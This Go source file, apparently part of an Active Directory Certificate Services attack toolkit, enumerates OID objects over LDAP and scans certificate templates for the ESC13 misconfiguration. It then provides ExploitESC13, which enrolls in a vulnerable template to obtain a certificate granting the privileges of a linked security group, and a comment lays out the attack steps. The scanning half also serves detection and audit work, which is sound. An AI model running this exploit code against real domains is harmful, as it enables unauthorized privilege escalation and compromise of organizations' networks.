package pki

import (
	"context"
	"crypto"
	"crypto/x509"
	"fmt"
	"strings"

	"github.com/go-ldap/ldap/v3"
)

// OIDObject represents an msPKI-Enterprise-Oid object from the OID container
// in Active Directory's Public Key Services configuration.
type OIDObject struct {
	Name          string `json:"name"`
	DN            string `json:"dn"`
	OID           string `json:"oid"`
	GroupLink     string `json:"group_link"`      // msDS-OIDToGroupLink DN
	GroupLinkName string `json:"group_link_name"` // CN extracted from GroupLink DN
}

// ESC13Finding records a template whose issuance policy OID is linked to a
// security group via msDS-OIDToGroupLink — the ESC13 attack primitive.
type ESC13Finding struct {
	TemplateName      string `json:"template_name"`
	IssuancePolicyOID string `json:"issuance_policy_oid"`
	LinkedGroup       string `json:"linked_group"`      // full DN
	LinkedGroupName   string `json:"linked_group_name"` // CN
}

// buildOIDBaseDN constructs the LDAP base DN for the OID container under
// CN=Public Key Services,CN=Services,CN=Configuration.
func buildOIDBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	dcParts := make([]string, 0, len(parts))
	for _, p := range parts {
		dcParts = append(dcParts, "DC="+p)
	}
	return "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration," + strings.Join(dcParts, ",")
}

// cnFromDN extracts the first CN= value from a distinguished name.
func cnFromDN(dn string) string {
	for _, part := range strings.Split(dn, ",") {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(strings.ToUpper(part), "CN=") {
			return part[3:]
		}
	}
	return dn
}

// EnumerateOIDObjects queries LDAP for all msPKI-Enterprise-Oid objects in the
// OID container and returns those that have a msDS-OIDToGroupLink attribute set.
// Objects without a group link are included in the result but will have empty
// GroupLink/GroupLinkName fields.
func EnumerateOIDObjects(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) ([]OIDObject, error) {
	baseDN := buildOIDBaseDN(cfg.Domain)
	filter := "(objectClass=msPKI-Enterprise-Oid)"
	attrs := []string{
		"cn",
		"distinguishedName",
		"msPKI-Cert-Template-OID",
		"msDS-OIDToGroupLink",
	}

	fmt.Printf("[*] Enumerating OID objects: base=%s\n", baseDN)

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false, filter, attrs, nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return nil, fmt.Errorf("LDAP search OID objects: %w", err)
	}

	var objects []OIDObject
	for _, entry := range result.Entries {
		obj := OIDObject{
			Name:      entry.GetAttributeValue("cn"),
			DN:        entry.GetAttributeValue("distinguishedName"),
			OID:       entry.GetAttributeValue("msPKI-Cert-Template-OID"),
			GroupLink: entry.GetAttributeValue("msDS-OIDToGroupLink"),
		}
		if obj.GroupLink != "" {
			obj.GroupLinkName = cnFromDN(obj.GroupLink)
		}
		objects = append(objects, obj)
	}

	fmt.Printf("[+] Found %d OID object(s)\n", len(objects))
	return objects, nil
}

// ScanESC13 detects ESC13 — issuance policy OIDs linked to security groups via
// msDS-OIDToGroupLink. When a certificate template includes such an OID in its
// msPKI-Certificate-Application-Policy, any user who enrolls in that template
// receives a certificate that grants membership in the linked group.
//
// Attack flow:
//  1. Attacker enrolls in a template whose issuance policy references a linked OID
//  2. The issued certificate contains the issuance policy OID
//  3. Kerberos PKINIT maps the OID to the linked security group
//  4. Attacker gains privileges of the linked group without direct membership
func ScanESC13(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) ([]ESC13Finding, error) {
	fmt.Println("[*] Scanning for ESC13 (OID group link abuse)...")

	// Step 1: Enumerate OID objects with a group link
	oidObjects, err := EnumerateOIDObjects(ctx, cfg, conn)
	if err != nil {
		return nil, fmt.Errorf("enumerate OID objects: %w", err)
	}

	// Build a map of OID string -> OIDObject for objects that have a group link
	linkedOIDs := make(map[string]OIDObject)
	for _, obj := range oidObjects {
		if obj.GroupLink != "" {
			linkedOIDs[obj.OID] = obj
			fmt.Printf("[+] Linked OID: %s (%s) -> group %s\n", obj.OID, obj.Name, obj.GroupLinkName)
		}
	}

	if len(linkedOIDs) == 0 {
		fmt.Println("[*] No OID objects with msDS-OIDToGroupLink found.")
		return nil, nil
	}

	// Step 2: Enumerate templates and cross-reference issuance policy OIDs
	templates, err := EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var findings []ESC13Finding
	for _, tmpl := range templates {
		for _, policyOID := range tmpl.IssuancePolicyOIDs {
			if obj, ok := linkedOIDs[policyOID]; ok {
				finding := ESC13Finding{
					TemplateName:      tmpl.Name,
					IssuancePolicyOID: policyOID,
					LinkedGroup:       obj.GroupLink,
					LinkedGroupName:   obj.GroupLinkName,
				}
				findings = append(findings, finding)
				fmt.Printf("[!] ESC13: Template %q has issuance policy %s linked to group %s\n",
					tmpl.Name, policyOID, obj.GroupLinkName)
			}
		}
	}

	if len(findings) == 0 {
		fmt.Println("[*] No ESC13 findings — no templates reference linked OIDs.")
	} else {
		fmt.Printf("[!] ESC13: %d finding(s) detected\n", len(findings))
	}

	return findings, nil
}

// ExploitESC13 enrolls in a template whose issuance policy OID is linked to a
// security group via msDS-OIDToGroupLink. The issued certificate will contain
// the issuance policy, granting the enrollee effective membership in the linked
// group during Kerberos PKINIT authentication.
//
// This reuses the standard certificate enrollment pattern from ExploitESC1 —
// the key difference is that ESC13 does not require enrollee-supplies-subject;
// the privilege escalation comes from the OID-to-group mapping, not SAN control.
func ExploitESC13(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] ESC13 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	// Step 1: Verify the template is ESC13-exploitable
	findings, err := ScanESC13(ctx, cfg, conn)
	if err != nil {
		return nil, nil, fmt.Errorf("ESC13 scan: %w", err)
	}

	var matchedFinding *ESC13Finding
	for i, f := range findings {
		if f.TemplateName == templateName {
			matchedFinding = &findings[i]
			break
		}
	}
	if matchedFinding == nil {
		return nil, nil, fmt.Errorf("template %q has no ESC13 finding (no linked issuance policy OID)", templateName)
	}

	fmt.Printf("[+] Template %q confirmed ESC13 vulnerable\n", templateName)
	fmt.Printf("[*] Issuance policy OID: %s\n", matchedFinding.IssuancePolicyOID)
	fmt.Printf("[*] Linked group: %s (%s)\n", matchedFinding.LinkedGroupName, matchedFinding.LinkedGroup)

	// Step 2: Enroll for a CA-signed certificate with the target UPN.
	// The issuance policy OID is embedded by the CA during enrollment based on
	// the template's msPKI-Certificate-Application-Policy — we don't need to
	// inject it manually. The enrolled cert will receive the linked OID from
	// the template configuration.
	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, false)
	if err != nil {
		return nil, nil, fmt.Errorf("enrollment failed: %w", err)
	}

	fmt.Printf("[+] Certificate obtained for %s via ESC13 on template %q\n", targetUPN, templateName)
	fmt.Printf("[*] The issued certificate's issuance policy OID (%s) maps to group %s\n",
		matchedFinding.IssuancePolicyOID, matchedFinding.LinkedGroupName)
	fmt.Printf("[*] The TGT will include group membership for: %s\n", matchedFinding.LinkedGroupName)
	return cert, certKey, nil
}
